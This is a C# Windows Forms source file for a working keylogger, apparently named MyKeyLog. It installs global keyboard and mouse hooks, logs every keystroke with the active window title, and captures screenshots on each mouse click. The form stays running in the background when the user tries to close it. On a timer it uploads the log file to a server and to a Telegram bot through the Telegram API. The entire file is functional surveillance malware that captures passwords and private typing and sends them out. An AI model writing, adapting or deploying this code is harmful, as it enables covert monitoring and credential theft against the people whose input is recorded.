using System.Globalization;
using System.Runtime.InteropServices;
using System.Text;
using System.Drawing.Imaging;


namespace MyKeyLog
{
    public partial class Form1 : Form
    {
        const int WH_KEYBOARD_LL = 13;
        const int WH_MOUSE_LL = 14;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_LBUTTONDOWN = 0x0201;
        private IntPtr _hookPtr = IntPtr.Zero;
        private IntPtr _mouseHookPtr = IntPtr.Zero;
        private LowLevelKeyboardProc _proc;
        private LowLevelMouseProc _mouseProc;
        private StringBuilder _inputBuffer = new StringBuilder();
        private NotifyIcon _trayIcon;
        private string _activeWindowTitle;
        private DateTime _lastInputTime;
        private string _logFilePath = "UserActivityLog.txt";
        private string _screenshotFolderPath = "Screenshots";
        private Server _server;


        public Form1()
        {
            InitializeComponent();
            _server = new Server("http://localhost:5000/upload");
            _server.OnLogFileSent += DisplaySendLogMessage;
            _proc = HookCallback;
            _mouseProc = MouseHookCallback;
            InitializeTrayIcon();
            SetHook();
            StartLogSendingTimer();
            EnsureScreenshotFolderExists();
        }
        private void EnsureScreenshotFolderExists()
        {
            if (!Directory.Exists(_screenshotFolderPath))
            {
                Directory.CreateDirectory(_screenshotFolderPath);
            }
        }
        private void DisplaySendLogMessage(string message)
        {
            _trayIcon.ShowBalloonTip(3000, "Log File Status", message, ToolTipIcon.Info);
        }
        private void InitializeTrayIcon()
        {
            _trayIcon = new NotifyIcon
            {
                Icon = SystemIcons.Application,
                Visible = true,
                Text = "Activity Tracker"
            };
            _trayIcon.DoubleClick += (s, e) => ShowForm();
        }

        private void ShowForm()
        {
            Show();
            WindowState = FormWindowState.Normal;
        }

        private void SetHook()
        {
            _hookPtr = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, IntPtr.Zero, 0);
            _mouseHookPtr = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, IntPtr.Zero, 0);
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if (vkCode == (int)Keys.Back)
                {
                    if (_inputBuffer.Length > 0)
                    {
                        _inputBuffer.Remove(_inputBuffer.Length - 1, 1);
                        return CallNextHookEx(_hookPtr, nCode, wParam, lParam);
                    }
                }
                else if (vkCode >= (int)Keys.F1 && vkCode <= (int)Keys.F12)
                {
                    string functionKey = $"F{vkCode - (int)Keys.F1 + 1}";
                    _inputBuffer.Append(functionKey);
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, functionKey);
                }
                else if (vkCode == (int)Keys.PageUp)
                {
                    _inputBuffer.Append("PageUp");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "PageUp");
                }
                else if (vkCode == (int)Keys.PageDown)
                {
                    _inputBuffer.Append("PageDown");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "PageDown");
                }
                else if (vkCode == (int)Keys.Home)
                {
                    _inputBuffer.Append("Home");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "Home");
                }
                else if (vkCode == (int)Keys.End)
                {
                    _inputBuffer.Append("End");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "End");
                }
                else if (vkCode == (int)Keys.Insert)
                {
                    _inputBuffer.Append("Insert");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "Insert");
                }
                else if (vkCode == (int)Keys.Delete)
                {
                    _inputBuffer.Append("Delete");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "Delete");
                }
                else if (vkCode == (int)Keys.Escape)
                {
                    _inputBuffer.Append("Escape");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "Escape");
                }
                else if (vkCode == (int)Keys.Tab)
                {
                    _inputBuffer.Append("Tab");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "Tab");
                }
                else if (vkCode == (int)Keys.CapsLock)
                {
                    _inputBuffer.Append("CapsLock");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "CapsLock");
                }
                else if (vkCode == (int)Keys.Enter)
                {
                    _inputBuffer.Append("Enter");
                    LogActivity(GetActiveWindowTitle(), DateTime.Now, "Enter");
                }
                else
                {
                    char character = GetCharFromKey(vkCode);
                    if (character != '\0')
                    {
                        _inputBuffer.Append(character);
                        if (IsNewWindow())
                        {
                            _activeWindowTitle = GetActiveWindowTitle();
                            _lastInputTime = DateTime.Now;
                            LogActivity(_activeWindowTitle, _lastInputTime, _inputBuffer.ToString());
                        }

                        bool shiftPressed = IsKeyPressed((int)Keys.ShiftKey);
                        bool capsLockState = IsKeyToggled((int)Keys.CapsLock);
                        string language = GetKeyboardLanguage();
                        string keyDetails = $"{character} | SHIFT: {shiftPressed} | CAPS: {capsLockState} | LANG: {language}";
                        File.AppendAllText("DetailedLog.txt", keyDetails + Environment.NewLine);

                        if (IsNewWindow() || _inputBuffer.Length >= 50)
                        {
                            LogActivity(GetActiveWindowTitle(), DateTime.Now, _inputBuffer.ToString());
                        }
                    }
                }
            }
            return CallNextHookEx(_hookPtr, nCode, wParam, lParam);
        }

        // Mouse
        private IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                if (wParam == (IntPtr)WM_LBUTTONDOWN)
                {
                    TakeScreenshot();
                }
            }
            return CallNextHookEx(_mouseHookPtr, nCode, wParam, lParam);
        }

        private void TakeScreenshot()
        {
            using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(screenshot))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, Screen.PrimaryScreen.Bounds.Size);
                }
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string screenshotFilePath = Path.Combine(_screenshotFolderPath, $"screenshot_{timestamp}.png");
                screenshot.Save(screenshotFilePath, ImageFormat.Png);
                LogActivity("Mouse", DateTime.Now, $"Screenshot saved: {screenshotFilePath}");
            }
        }

        private char GetCharFromKey(int vkCode)
        {
            byte[] keyState = new byte[256];
            GetKeyboardState(keyState);

            bool shiftPressed = IsKeyPressed((int)Keys.ShiftKey);
            bool altGrPressed = IsKeyPressed((int)Keys.RMenu) && IsKeyPressed((int)Keys.ControlKey);

            if (shiftPressed)
                keyState[(int)Keys.ShiftKey] = 0x80;

            if (altGrPressed)
            {
                keyState[(int)Keys.RMenu] = 0x80;
                keyState[(int)Keys.ControlKey] = 0x80;
            }

            uint threadId = GetWindowThreadProcessId(GetForegroundWindow(), out _);
            IntPtr keyboardLayout = GetKeyboardLayout(threadId);

            StringBuilder sb = new StringBuilder(5);
            int result = ToUnicodeEx((uint)vkCode, 0, keyState, sb, sb.Capacity, 0, keyboardLayout);

            if (result > 0)
                return sb[0];

            return '\0';
        }

        private bool IsNewWindow()
        {
            string currentWindow = GetActiveWindowTitle();
            return _activeWindowTitle != currentWindow;
        }

        private string GetActiveWindowTitle()
        {
            IntPtr handle = GetForegroundWindow();
            StringBuilder sb = new StringBuilder(256);
            if (GetWindowText(handle, sb, sb.Capacity) > 0)
                return sb.ToString();
            return string.Empty;
        }

        private void LogActivity(string windowTitle, DateTime timestamp, string text)
        {
            try
            {
                using (FileStream fs = new FileStream(_logFilePath, FileMode.OpenOrCreate, FileAccess.Write, FileShare.ReadWrite))
                {
                    using (StreamWriter writer = new StreamWriter(fs))
                    {
                        string logEntry = $"[{windowTitle}] {timestamp:yyyy-MM-dd HH:mm:ss}\n{text}\n";
                        writer.Write(logEntry);
                    }
                }
            }
            catch (IOException ex)
            {
                Console.WriteLine($"IOException: {ex.Message}");
            }
        }


        private void StartLogSendingTimer()
        {
            System.Timers.Timer timer = new System.Timers.Timer(36000);
            timer.Elapsed += (s, e) => SendLogFile();
            timer.Start();
        }

        private async void SendLogFile()
        {
            try
            {
                await _server.SendLogFileToServerAsync(_logFilePath);
                MessageBox.Show("Log file has been successfully sent to the server", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error sending log file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            string botToken = "yourTOKEN";
            string chatId = "YourchatId";
            string logFilePath = _logFilePath;

            using (var httpClient = new HttpClient())
            {
                using (var content = new MultipartFormDataContent())
                {
                    content.Add(new StringContent(chatId), "chat_id");
                    content.Add(new StringContent("Activity Log"), "caption");
                    var fileStream = new FileStream(logFilePath, FileMode.Open, FileAccess.Read);
                    content.Add(new StreamContent(fileStream), "document", Path.GetFileName(logFilePath));

                    var response = await httpClient.PostAsync($"https://api.telegram.org/bot{botToken}/sendDocument", content);

                    if (response.IsSuccessStatusCode)
                    {
                        string result = await response.Content.ReadAsStringAsync();
                        File.AppendAllText("ResponseLog.txt", result + Environment.NewLine);
                    }
                    else
                    {
                        string errorResult = await response.Content.ReadAsStringAsync();
                        File.AppendAllText("ErrorLog.txt", $"Error: {response.StatusCode} - {errorResult}" + Environment.NewLine);
                    }
                }
            }
        }

        private static bool IsKeyPressed(int key)
        {
            short keyState = GetKeyState(key);
            return (keyState & 0x8000) != 0;
        }

        private static bool IsKeyToggled(int key)
        {
            short keyState = GetKeyState(key);
            return (keyState & 0x0001) != 0;
        }

        private static string GetKeyboardLanguage()
        {
            uint threadId = GetWindowThreadProcessId(GetForegroundWindow(), out _);
            IntPtr keyboardLayout = GetKeyboardLayout(threadId);
            int cultureId = keyboardLayout.ToInt32() & 0xFFFF;
            CultureInfo cultureInfo = new CultureInfo(cultureId);
            return cultureInfo.TwoLetterISOLanguageName;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
            Hide();
        }

        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId); // Mouse hook

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
    }
}
